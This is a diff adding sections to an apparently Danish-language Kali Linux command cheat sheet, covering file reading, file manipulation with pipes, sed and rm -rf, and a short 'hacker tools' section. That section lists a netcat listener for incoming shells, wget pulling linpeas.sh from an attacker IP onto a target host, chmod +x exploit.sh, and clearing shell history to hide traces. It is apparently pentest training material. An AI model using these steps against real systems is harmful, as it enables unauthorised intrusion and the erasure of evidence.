@@ -269,10 +269,271 @@ AbuIshak.ovpn  fragmentation_scan.txt                    ngrok-v3-stable-linux-a
 article.html   google-chrome-stable_current_amd64.deb    numbers.txt                      userpass.txt
 combined.txt   google-chrome-stable_current_amd64.deb.1  passwords.txt                    users.txt
 ```
-## Læsning og inspection af filer
+## 3. Læsning og inspektion af filer
+3.1 Print alt indeholdet af en fil ud på en gang
+```bash
+cat target.file
+```
+```console
+┌──(kali㉿kali)-[~]
+└─$ cat userpass.txt 
+root toor
+admin password
+user 123456
+guest admin
+```
+3.2 Åben en fil i en "reader-mode" hvor du kan scroll op og ned (tryk CTRL+Z for at komme ud af filen)
+```bash
+less target.file
+```
+```console
+flowers
+cristian
+tintin
+bianca
+chrisbrown
+chester
+101010
+smokey
+silver
+internet
+sweet
+strawberry
+garfield
+dennis
+panget
+francis
+cassie
+benfica
+love123
+:
+(END)
+```
+3.3 Læs en fils første 10 linjer (brug -n xyz for et specifikt antal linjer fra første linje)
+```bash
+head target.file
+```
+```console
+┌──(kali㉿kali)-[/usr/share/wordlists]
+└─$ head rockyou.txt
+123456
+12345
+123456789
+password
+iloveyou
+princess
+1234567
+rockyou
+12345678
+abc123
+```
+3.4 Læs en fils sidste 10 linjer 
+```bash
+tail target.file
+```
+```console
+┌──(kali㉿kali)-[/usr/share/wordlists]
+└─$ tail rockyou.txt                        
+       1234567
+       1
+                  
+            
+           
+▒xCvBnM,
+ie168
+abygurl69
+a6_123
+*7¡Vamos!
+```
+3.5 Læs en fils sidste 10 linjer og følg med live på de nyeste tilføjelser
+```bash
+tail -f target.file
+```
+```console
+┌──(kali㉿kali)-[~]
+└─$ tail -f TestFil.txt
+hej
+h
+23
+jj32j9
+ksadkaskdad12283129asd
+ads1237asdh92ghad
+7129afladas87zxfjfaksdasdh
+1283nasfdA 8AWd
+sadja9fgaj
+sidste
+denne linje er sat på live
+```
+3.6 Søg efter en specifik tekst inde i en fil der kun de linjer der matcher (brug -i option for at søge case-insensitive)
+```bash
+grep "søgeord" target.file
+```
+```console
+┌──(kali㉿kali)-[~]
+└─$ grep "h" TestFil.txt                       
+hej
+h
+ads1237asdh92ghad
+7129afladas87zxfjfaksdasdh
+```
+3.7 Find ud af hvilken type en fil er (bruges fordi en fil kan have et fake filnavn for skjule information)
+```bash
+file target.file
+```
+```console
+┌──(kali㉿kali)-[~]
+└─$ file TestFil.txt
+TestFil.txt: Unicode text, UTF-8 text
+```
+## 4. Fil manipulation
+4.1 Output file direction med ">"
+```bash
+example.scan > ScanList.txt
+```
+```console
+──(kali㉿kali)-[~]
+└─$ ls -ah > fil_liste.txt 
+
+┌──(kali㉿kali)-[~]
+└─$ cat fil_liste.txt
+.
+..
+1to100.py
+AbuIshak.ovpn
+article.html
+.bash_logout
+.bashrc
+.bashrc.original
+.BurpSuite
+.cache
+combined.txt
+.config
+Desktop
+.dmrc
+```
+4.2 Tilføj noget til en fil med eksempelvis echo og ">>"
+```bash
+echo TargetText >> TargetFile.txt                    
+```
+```console
+┌──(kali㉿kali)-[~]
+└─$ echo TargetText >> TestFil2.txt              
+┌──(kali㉿kali)-[~]
+└─$ cat TestFil2.txt               
+Test2
+Test2Fil
+TestFil.txt
+TargetText
+```
+4.3 Tag outputtet fra noget i venstre side og giv det til noget i højre ned Pipe " | ". 
+```bash
+cat Example.file | grep "Example Text"                  
+```
+```console
+┌──(kali㉿kali)-[~]
+└─$ cat TestFil2.txt | grep "Target"
+TargetText                 
+```
+Du kan eksempelvis også tail -f en fil også pipe den til en grep "søgeord" for at se om der bliver tilføjet det søgeord live til den fil du follower
+```bash
+tail -f TestFil2.txt | grep "Important Keyword"              
+```
+Egentlig kan du pipe uendeligt til dine egne behov. Her er en pipe der først henter data fra en fil, filtrerer dataen, sorterer det, fjerner alle doubles (uniq) og til sidst skærer alt andet fra og viser kun de 5 øverste resultater.
+```bash
+cat list.txt | grep "admin" | sort | uniq | head -n 5            
+```
+4.3 Tekst-editor i kommandolinjen. Brug nano til at manuelt at skrive i en fil
+```bash
+nano Example.File             
+```
+4.4 Fjern eller erstat et tegn i en fil
+```bash
+cat Example.File | tr "A" "B"                  
+```
+```console
+┌──(kali㉿kali)-[~]
+└─$ cat TestFil2.txt
+Test2
+Test2Fil
+TestFil.txt
+TargetText
+GammelText
+
+┌──(kali㉿kali)-[~]
+└─$ cat TestFil2.txt | tr "G" "A"               
+Test2
+Test2Fil
+TestFil.txt
+TargetText
+AammelText              
+```
+4.5 Erstat et ord med et andet
+```bash
+cat Example.File | sed 's/OldWord/NewWord/g'                  
+```
+```console
+┌──(kali㉿kali)-[~]
+└─$ cat TestFil2.txt | sed 's/GammelText/NyText/g'
+Test2
+Test2Fil
+TestFil.txt
+TargetText
+NyText
+```
+4.6 opret en ny tom fil
+```bash
+touch Example.File               
+```
+```bash
+┌──(kali㉿kali)-[~]
+└─$ touch NyFil.txt  
+```
+4.7 kopierer en fil
+```bash
+cp Example.file copy                  
+```
+```bash
+┌──(kali㉿kali)-[~]
+└─$ cp NyFil.txt NyFil2.txt   
+```
+4.8 slet en fil
+```bash
+rm Example.file         
+```
+```bash
+└─$ rm NyFil2.txt  
+```
+4.9 fjern en mappe og alt hvad der i den uden at spørge om lov
+```bash
+rm -rf Folder         
+```
+
+## 5. Netværk
 
 
-
-
-
-
+## 6. Hacker Værktøjer
+6.1 Åben en "lytte-port" på din egen maskine som venter på noget forbinder tilbage til din maskine
+```bash
+nc lvnp 4444        
+```
+```console
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444    
+listening on [any] 4444 ...
+```
+6.2 Omdan en mappe til en hjemmeside og download dine filer fra target host
+```bash
+pyton3 -m http.server [port]      
+```
+6.3 Download som bruges på target host til at hente filer fra din maskine
+```bash
+wget http://10.10.10.5:8000/linpeas.sh   
+```
+6.4 Gør en fil runable, eksempelvis en ond tekstfil som bliver til et script efter den bliver gjort runable
+```bash
+chmod +x exploit.sh
+```
+6.5 Slet terminalens hukommelse og logud så der er færre spor af dit besøg på target host
+```bash
+history -c && exit
+```
